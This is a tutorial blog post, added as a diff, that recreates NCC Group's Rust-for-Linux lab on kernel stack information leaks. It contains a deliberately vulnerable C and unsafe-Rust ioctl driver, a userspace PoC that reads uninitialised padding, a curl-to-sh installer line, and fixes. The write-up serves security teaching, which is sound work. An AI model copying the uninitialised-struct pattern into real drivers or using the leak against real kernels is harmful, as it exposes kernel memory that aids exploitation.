@@ -1,0 +1,360 @@
+---
+title: Rustproofing - Leaking Addresses
+description: 在本文中，作者 nova 详细介绍了如何在 Linux 内核版本 6.1 中利用 Rust 支持来进行内核漏洞利用（Kernel PWN）。文章内容主要涵盖了环境设置、漏洞演示以及修复方法。
+pubDate: 2023-02-17
+tags:
+- pwn
+- kernel
+authors:
+- nova
+---
+
+import Link from '@docusaurus/Link';
+
+This is actually the very first time I dig into Kernel PWN LOL
+
+Since Kernel Version 6.1, **Rust** support has been merged into Linux.
+
+<!--truncate-->
+
+## Environment
+
+We first create a new directory for this project.
+
+```bash
+mkdir rustproofing-linux
+cd rustproofing-linux
+```
+
+### rustproofing-linux
+
+This is the source code of our exploit
+
+```bash
+git clone https://github.com/nccgroup/rustproofing-linux.git
+```
+
+### Rust-for-Linux
+
+The source code of Rust-for-linux, we checkout to the latest commit for stability.
+
+```bash
+git clone https://github.com/Rust-for-Linux/linux rust-for-linux # 4G around
+cd rust-for-linux
+git checkout bd123471269354fdd504b65b1f1fe5167cb555fc  # latest commit at the point of writing
+cd ..
+```
+
+But before that, make sure all the dependencies are installed.
+
+See [linux/quick-start.rst at rust · Rust-for-Linux/linux](https://github.com/Rust-for-Linux/linux/blob/rust/Documentation/rust/quick-start.rst) for details.
+
+:::note
+
+In my case, I installed `lld`, `llvm`, `clang` using APT
+
+```bash
+sudo apt install ldd llvm clang -y
+```
+
+`rust` using
+
+```bash
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+source "$HOME/.cargo/env"
+```
+
+`rustc` using
+
+```bash
+cd rust-for-linux
+rustup override set $(scripts/min-tool-version.sh rustc)
+rustup default 1.62.0  # I can't compile without this one, otherwise it will still use my 1.67 version rustc.
+```
+
+`bindgen` using cargo.
+
+```bash
+cargo install --locked --version $(scripts/min-tool-version.sh bindgen) bindgen
+```
+
+then, try
+
+```bash
+make LLVM=1 rustavailable
+```
+
+if `Rust is available!` pops up, you're all set.
+
+:::
+
+### virtme
+
+:::info
+
+Virtme is a set of simple tools to run a virtualized Linux kernel that uses the host Linux distribution or a simple rootfs instead of a whole disk image.
+
+:::
+
+For convenience, we build [virtme](https://github.com/amluto/virtme) up.
+
+simply clone it, ~~and we're done.~~
+
+```bash
+git clone https://github.com/amluto/virtme
+```
+
+`-watchdog ` is deprecated in `qemu 7.2.0`, modify it to `-device i6300esb -action watchdog=pause `.
+
+```bash
+vim ..virtme/virtme/architectures.py
+```
+
+```python title=/virtme/architectures.py#L72
+    @staticmethod
+    def qemuargs(is_native):
+        ret = Arch.qemuargs(is_native)
+
+        # Add a watchdog.  This is useful for testing.
+        ret.extend(['-device', 'i6300esb', '-action', 'watchdog=pause'])
+        """ Modified from `ret.extend(['-watchdog', 'i6300esb'])`"""
+
+        if is_native and os.access('/dev/kvm', os.R_OK):
+            # If we're likely to use KVM, request a full-featured CPU.
+            # (NB: if KVM fails, this will cause problems.  We should probe.)
+            ret.extend(['-cpu', 'host'])  # We can't migrate regardless.
+
+        return ret
+```
+
+### Compile the kernels
+
+```bash
+cd rust-for-linux
+mkdir `pwd`.out
+cp ../rustproofing-linux/configs/config-base `pwd`.out/.config
+KBUILD_OUTPUT=`pwd`.out make -j$(nproc) LLVM=1
+```
+
+:::note
+
+We have some settings in `config-base`
+
+```bash title=config-base#Line4444
+CONFIG_INIT_STACK_NONE=y
+# CONFIG_INIT_STACK_ALL_PATTERN is not set
+# CONFIG_INIT_STACK_ALL_ZERO is not set
+```
+
+which disable **automatic stack variable initialisation**
+
+:::
+
+![image-20230217154242780](https://oss.nova.gal/img/image-20230217154242780.png)
+
+### compile drivers
+
+in `rustproofing-linux` folder
+
+```bash
+make
+```
+
+If everything goes well, which means, your previous environments built perfectly., you should be able to see `*.ko` files in this folder and ELF files in `poc` folder.
+
+Congratulations! The environment is set.
+
+~~This takes me more than 5 hours though lol~~
+
+:::note
+
+If you edited PoC or driver's source code, use this line to update the PoC / driver
+
+```bash
+make LLVM=1 KDIR=../rust-for-linux.out clean && make LLVM=1 KDIR=../rust-for-linux.out
+```
+
+:::
+
+### start virtme
+
+```bash
+../virtme/virtme-run --kdir `pwd`/../rust-for-linux.out --show-command --show-boot-console --mods=auto -a "kasan_multi_shot" --qemu-opts -cpu core2duo -m 1G -smp 2
+```
+
+### use PoC
+
+in `PoC` folder, we have a file called `test.sh` which allows us to test our PoC
+
+usage:
+
+```bash
+test.sh module_name[fixed]
+# equals to
+#	insmod ../vuln_printk_leak.ko
+#	./poc_vuln_printk_leak
+#	rmmod ../vuln_printk_leak.ko
+```
+
+example:
+
+```bash
+test.sh vuln_printk_leak
+```
+
+## Leaking stack contents
+
+While `CONFIG_INIT_STACK_NONE=y` is set, we can actually leak kernel memory address by initializing a struct without filling all of its members.
+
+Let's load an example driver to demonstrate this. ( in C )
+
+```C
+struct vuln_info {
+	u8 version;
+	u64 id;
+	u8 _reserved;
+};
+
+#define VULN_GET_INFO _IOR('v', 2, struct vuln_info)
+
+
+static long vuln_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
+{
+	struct vuln_info info;
+
+	switch (cmd) {
+	case VULN_GET_INFO:
+		info = (struct vuln_info) {
+			.version = 1,
+			.id = 0x1122334455667788,
+		};
+		if (copy_to_user((void __user *)arg, &info, sizeof(info)) != 0)
+			return -EFAULT;
+		return 0;
+	}
+
+	pr_err("error: wrong ioctl command: %#x\n", cmd);
+	return -EINVAL;
+}
+```
+
+We have defined a struct with 3 members but have only initialized 2 of its members.
+
+And now let's see our PoC.
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+
+
+#define u8 unsigned char
+#define u64 unsigned long long
+
+struct vuln_info {
+	u8 version;
+	u64 id;
+	u8 _reserved;
+};
+
+#define VULN_GET_INFO _IOR('v', 2, struct vuln_info)
+
+
+int main(int argc, char **argv)
+{
+	int fd = open("/dev/vuln_stack_leak", O_RDWR);
+	if (fd < 0) {
+		perror("open error");
+		return -1;
+	}
+
+	struct vuln_info info = { 0 };
+
+	if (ioctl(fd, VULN_GET_INFO, &info) < 0)
+		perror("ioctl");
+
+	struct vuln_info expected;
+	memset(&expected, 0, sizeof(expected));
+	expected = (struct vuln_info) {
+		.version = 1,
+		.id = 0x1122334455667788,
+	};
+
+	int i;
+	u64 *info_ptr = (u64*)&info;
+	u64 *exp_ptr = (u64*)&expected;
+	for (i=0; i<sizeof(info)/sizeof(u64); i++) {
+		if (info_ptr[i] != exp_ptr[i]) {
+			printf("value at offset %ld differs: %#llx vs %#llx\n", i*sizeof(u64), info_ptr[i], exp_ptr[i]);
+		}
+	}
+
+	return 0;
+}
+```
+
+It is interesting to explain how we interact with driver, but we'll talk it in later.
+
+now, let's take a look at how this driver will leak our kernel memory.
+
+![image-20230224132905008](https://oss.nova.gal/img/image-20230224132905008.png)
+
+our `version` was set to _1_, but because the struct was not filled with `0` at initial, it actually contains some of the kernel info, and it is leaked while we're copying the struct to user space.
+
+![image-20230224133211571](https://oss.nova.gal/img/image-20230224133211571.png)
+
+### In Rust
+
+I'm not familiar with Rust, let alone Kernel Rust.
+
+But we can still extract the relevant code from it.
+
+```rust
+#[repr(C)] // same struct layout as in C, since we are sending it to userspace
+struct VulnInfo {
+    version: u8,
+    id: u64,
+    _reserved: u8,
+}
+
+        match cmd {
+            VULN_GET_INFO => {
+                let info = VulnInfo {
+                    version: 1,
+                    id: 0x1122334455667788,
+                    _reserved: 0, // compiler requires an initialiser
+                };
+
+                // pointer weakening coercion + cast
+                let info_ptr = &info as *const _ as *const u8;
+                // SAFETY: "info" is declared above and is local
+                unsafe { writer.write_raw(info_ptr, size_of_val(&info))? };
+```
+
+In short, We just simply use `unsafe` `writer.write_raw` to replace `copy_to_user` function in C.
+
+`write_raw` is `unsafe` as we programmer have to guarantee the pointer is safe, which is something that we won't make here.
+
+Let's try our `PoC` again
+
+![image-20230224134458315](https://oss.nova.gal/img/image-20230224134458315.png)
+
+However, comparing with C version, the Rust Version contains `unsafe` flag to notice our driver programmers to think twice before writing this vulnerable code.
+
+## Fixes To This
+
+This problem can be fixed pretty easily:
+
+- We can unset `CONFIG_INIT_STACK_NONE=y` or set `CONFIG_INIT_STACK_ALL_ZERO=y` to let the compiler to fulfill it automatically.
+
+- Simply using `memset` before initializing our struct
+
+  > In Rust, we can use `MaybeUninit` porting variation,
+  >
+  > simply add `let mut info = MaybeUninit::<VulnInfo>::zeroed();` before initailizing
+
+## Reference
+
+[Rustproofing Linux (Part 1/4 Leaking Addresses) – NCC Group Research](https://research.nccgroup.com/2023/02/06/rustproofing-linux-part-1-4-leaking-addresses/)
